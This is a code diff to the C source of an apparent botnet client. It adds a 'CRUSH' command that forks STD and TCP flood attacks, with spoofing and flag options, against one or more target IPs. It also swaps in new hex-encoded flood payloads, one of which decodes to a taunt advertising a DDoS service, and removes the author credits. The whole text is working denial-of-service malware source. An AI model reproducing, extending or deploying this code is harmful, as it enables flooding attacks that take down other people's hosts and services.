@@ -1,6 +1,3 @@
-// an epic client
-// created by Kaden
-// Updated often
 #include <stdlib.h>
 #include <stdarg.h>
 #include <stdio.h>
@@ -46,7 +43,7 @@
 #define OPT_SGA   3
 #define SOCKBUF_SIZE 1024
 #define STD2_SIZE 69
-#define Demon_std 1460
+#define std_packet 1460
 
 
 
@@ -613,10 +610,16 @@ void SendSTDHEX(unsigned char *ip, int port, int secs)
 	unsigned int a = 0;
 	while(1)
 	{
-		char *hexstring[] = {"/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A"};
+		char *hexstring[] = {
+        "\x64\x61\x79\x7a\x64\x64\x6f\x73\x2e\x63\x6f\x20\x72\x75\x6e\x73\x20\x79\x6f\x75\x20\x69\x66\x20\x79\x6f\x75\x20\x72\x65\x61\x64\x20\x74\x68\x69\x73\x20\x6c\x6f\x6c\x20\x74\x68\x65\x6e\x20\x79\x6f\x75\x20\x74\x63\x70\x20\x64\x75\x6d\x70\x65\x64\x20\x69\x74\x20\x62\x65\x63\x61\x75\x73\x65\x20\x69\x74\x20\x68\x69\x74\x20\x79\x6f\x75\x20\x61\x6e\x64\x20\x79\x6f\x75\x20\x6e\x65\x65\x64\x20\x74\x6f\x20\x70\x61\x74\x63\x68\x20\x69\x74\x20\x6c\x6f\x6c\x6f\x6c\x6f\x6c\x6f\x6c\x6f\x6c",
+        "/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A",
+        "\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA",//Made By Zinqo.
+        "\x0D\x1E\x1F\x12\x06\x62\x26\x12\x62\x0D\x12\x01\x06\x0D\x1C\x01\x32\x12\x6C\x63\x1B\x32\x6C\x63\x3C\x32\x62\x63\x6C\x26\x12\x1C\x12\x6C\x63\x62\x06\x12\x21\x2D\x32\x62\x11\x2D\x21\x32\x62\x10\x12\x01\x0D\x12\x30\x21\x2D\x30\x13\x1C\x1E\x10\x01\x10\x3E\x3C\x32\x37\x01\x0D\x10\x12\x12\x30\x2D\x62\x10\x12\x1E\x10\x0D\x12\x1E\x1C\x10\x12\x0D\x01\x10\x12\x1E\x1C\x30\x21\x2D\x32\x30\x2D\x30\x2D\x21\x30\x21\x2D\x3E\x13\x0D\x32\x20\x33\x62\x63\x12\x21\x2D\x3D\x36\x12\x62\x30\x61\x11\x10\x06\x00\x17\x22\x63\x2D\x02\x01\x6C\x6D\x36\x6C\x0D\x02\x16\x6D\x63\x12\x02\x61\x17\x63\x20\x22\x6C\x2D\x02\x63\x6D\x37\x22\x63\x6D\x00\x02\x2D\x22\x63\x6D\x17\x22\x2D\x21\x22\x63\x00\x30\x32\x60\x30\x00\x17\x22\x36\x36\x6D\x01\x6C\x0D\x12\x02\x61\x20\x62\x63\x17\x10\x62\x6C\x61\x2C\x37\x22\x63\x17\x0D\x01\x3D\x22\x63\x6C\x17\x01\x2D\x37\x63\x62\x00\x37\x17\x6D\x63\x62\x37\x3C\x54",
+        "\x26\x3C\x35\x35\x36\x3D\x20\x77\x75\x31\x76\x35\x30\x77\x28\x7D\x27\x29\x7D\x7D\x34\x36\x3C\x21\x73\x30\x2D\x2D\x29\x77\x77\x2A\x2B\x32\x37\x2F\x2B\x72\x73\x22\x36\x7C\x31\x24\x21\x73\x7C\x28\x36\x77\x72\x34\x72\x24\x70\x2E\x2B\x3F\x28\x26\x23\x24\x2F\x71\x7D\x7C\x72\x7C\x74\x26\x28\x21\x32\x2F\x23\x33\x20\x20\x2C\x2F\x7C\x20\x23\x28\x2A\x2C\x20\x2E\x36\x73\x2A\x27\x74\x31\x7D\x20\x33\x2C\x30\x29\x72\x3F\x73\x23\x30\x2D\x34\x74\x2B\x2E\x37\x73\x2F\x2B\x71\x35\x2C\x34\x2C\x36\x34\x3D\x28\x24\x27\x29\x71\x2A\x26\x30\x77\x35\x2F\x35\x35\x37\x2E\x2F\x28\x72\x27\x23\x2F\x2D\x76\x31\x36\x74\x30\x29\x45",
+        "y8rtyutvybt978b5tybvmx0e8ytnv58ytr57yrn56745t4twev4vt4te45yn57ne46e456be467mt6ur567d5r6e5n65nyur567nn55sner6rnut7nnt7yrt7r6nftynr567tfynxyummimiugdrnyb"};
 		if (a >= 50)
 		{
-			send(std_hex, hexstring, Demon_std, 0);
+			send(std_hex, hexstring, std_packet, 0);
 			connect(std_hex,(struct sockaddr *) &sin, sizeof(sin));
 			if (time(NULL) >= start + secs)
 			{
@@ -641,7 +644,7 @@ sin.sin_family = hp->h_addrtype;
 sin.sin_port = port;
 unsigned int a = 0;
 while(1){
-char *randstrings[] = {"WYHRzp68omQcEaoW","xYjPH0XYQyNnZDd4","KaDeNTheBoTNETHeGOD","Iger8HgN8DU5Cv2m","E0H2DeSLyzQ93Bh2","zhYf0MvzTJ1S0ivq","oqogARpMjAvdjr9Qsrqj","yQAkUvZFjxExI3WbDp2g","35arWHE38SmV9qbaEDzZ","UQX1v4chpBay13JL","a7pInUoLgx1CPFlGB5JF","X1k5ICjenaWIZ4Gf","S1mQMZYF6uLzzkiULnGF","jKdmCH3hamvbN7ZvzkNA","1cvFW1QcSuZ627CQ","VckeqgSPaAA5jHdoFpCC","CwT01MAGqrgYRStHcV0X","72qeggInemBIQ5uJc1jQ","zwcfbtGDTDBWImROXhdn","w70uUC1UJYZoPENznHXB","EoXLAf1xXR7j4XSs0JTm","UkXK4CDG3OBO1vVufiKv","lSvZgNzxkUyChyxw1nSr","VQz4cDTxV8RRrgn00toF","SllNepLi918c9I8J","Kaden1337",};
+char *randstrings[] = {"WYHRzp68omQcEaoW","xYjPH0XYQyNnZDd4","ReLoAdTheBoTNETHeGOD","Iger8HgN8DU5Cv2m","E0H2DeSLyzQ93Bh2","zhYf0MvzTJ1S0ivq","oqogARpMjAvdjr9Qsrqj","yQAkUvZFjxExI3WbDp2g","35arWHE38SmV9qbaEDzZ","UQX1v4chpBay13JL","a7pInUoLgx1CPFlGB5JF","X1k5ICjenaWIZ4Gf","S1mQMZYF6uLzzkiULnGF","jKdmCH3hamvbN7ZvzkNA","1cvFW1QcSuZ627CQ","VckeqgSPaAA5jHdoFpCC","CwT01MAGqrgYRStHcV0X","72qeggInemBIQ5uJc1jQ","zwcfbtGDTDBWImROXhdn","w70uUC1UJYZoPENznHXB","EoXLAf1xXR7j4XSs0JTm","UkXK4CDG3OBO1vVufiKv","lSvZgNzxkUyChyxw1nSr","VQz4cDTxV8RRrgn00toF","SllNepLi918c9I8J","Reload1337",};
 char *STD2_STRING = randstrings[rand() % (sizeof(randstrings) / sizeof(char *))];
 if (a >= 50)
 {
@@ -914,6 +917,41 @@ void processCmd(int argc, unsigned char *argv[]) {
             _exit(0);
         }
     }
+                if(!strcmp(argv[0], "CRUSH"))
+        {
+            if(argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[4]) > 32 || (argc > 6 && atoi(argv[6]) < 0) || (argc == 8 && atoi(argv[7]) < 1))
+            { return;}
+            unsigned char *ip = argv[1];
+            int port = atoi(argv[2]);
+            int time = atoi(argv[3]);//Made By Zinqo.
+            int spoofed = atoi(argv[4]);
+            unsigned char *flags = argv[5];
+            int pollinterval = argc == 8 ? atoi(argv[7]) : 10;
+            int packetsize = argc > 6 ? atoi(argv[6]) : 0;
+                       int sleepcheck = (argc > 7 ? atoi(argv[7]) : 1000000);
+           int sleeptime = (argc > 8 ? atoi(argv[8]) : 0);
+            if(strstr(ip, ",") != NULL)
+            {
+                unsigned char *ip = strtok(ip, ",");
+                while(ip != NULL)
+                {
+                    if(!listFork())
+                    {
+                        SendSTD(ip, port, time, std_packet);
+                        SendTCP(ip, port, time, spoofed, flags, packetsize, pollinterval);
+                        close(mainCommSock);
+                        _exit(0);
+                    }
+                    ip = strtok(NULL, ",");
+                }
+            } else {
+                if (listFork()) { return; }
+                astd(ip, port, time, std_packet);
+                atcp(ip, port, time, spoofed, flags, packetsize, pollinterval);
+                close(mainCommSock);
+                _exit(0);
+            }
+        }
 
                 if(!strcmp(argv[0], "XMAS")){
             if(argc < 4 || atoi(argv[3]) > 10000){
